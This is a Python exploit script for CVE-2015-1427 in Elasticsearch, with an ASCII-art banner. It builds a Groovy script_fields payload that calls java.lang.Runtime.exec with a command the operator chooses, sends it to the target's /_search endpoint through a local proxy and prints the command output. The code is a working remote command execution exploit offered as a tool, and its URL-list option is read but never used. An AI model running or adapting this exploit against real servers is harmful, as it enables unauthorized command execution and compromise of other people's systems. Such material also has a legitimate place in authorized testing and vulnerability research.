from ast import Store
import re
import urllib.parse
import urllib3
import argparse
import requests

import sys

urllib3.disable_warnings()

def do_banner():
    print("")
    print("  ______     _______     ____   ___  _ ____        _ _  _  ____ _____  ")
    print(" / ___\ \   / / ____|   |___ \ / _ \/ | ___|      / | || ||___ \___  | ")
    print(" | |    \ \ / /|  _| _____ __) | | | | |___ \ _____| | || |_ __) | / / ")
    print(" | |___  \ V / | |__|_____/ __/| |_| | |___) |_____| |__   _/ __/ / /  ")
    print(" \____|  \_/  |_____|   |_____|\___/|_|____/      |_|  |_||_____/_/    ")
    print("")

proxy = {
    'http' : '127.0.0.1:8080',
    'https' : '127.0.0.1:8080'
}

if __name__ == "__main__":

    do_banner()

    parser = argparse.ArgumentParser(description='Elasticsearch Command Execute (CVE-2015-1427)')
    parser.add_argument('-u',action="store",dest="url",help="The url to test")
    parser.add_argument('-c',action="store",dest="command",required=True,help="The command to execute")
    parser.add_argument('-l',action="store",dest="list",help="The url list")
    args = parser.parse_args()

    if args.url and args.list:
        print("User specified both '-u' and '-l'. Only one may be chosen")
        sys.exit(1)

    if not args.url and not args.list:
        print("User specified neither '-u' nor '-l'. User must choose one")
        sys.exit(1)
    
    if args.command:
        print('[+] Generating a payload')
        exploit = '{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"'+args.command+'\\").getText()"}}}'
    
    if args.list:
        print('Loading url file...')
        with open(args.list, 'r') as file:
            f = file.readlines()

    target_url = args.url

    target_url += '/_search?pretty'

    print('[+] Sending expoit at ' + target_url)

    try:
        r=requests.post(target_url,data=exploit,proxies=proxy)
        c=re.compile(r'"lupin" : (.*)').findall(r.text)
        print(c)
    except:
        print('[-] The HTTP request failed')
        sys.exit(0)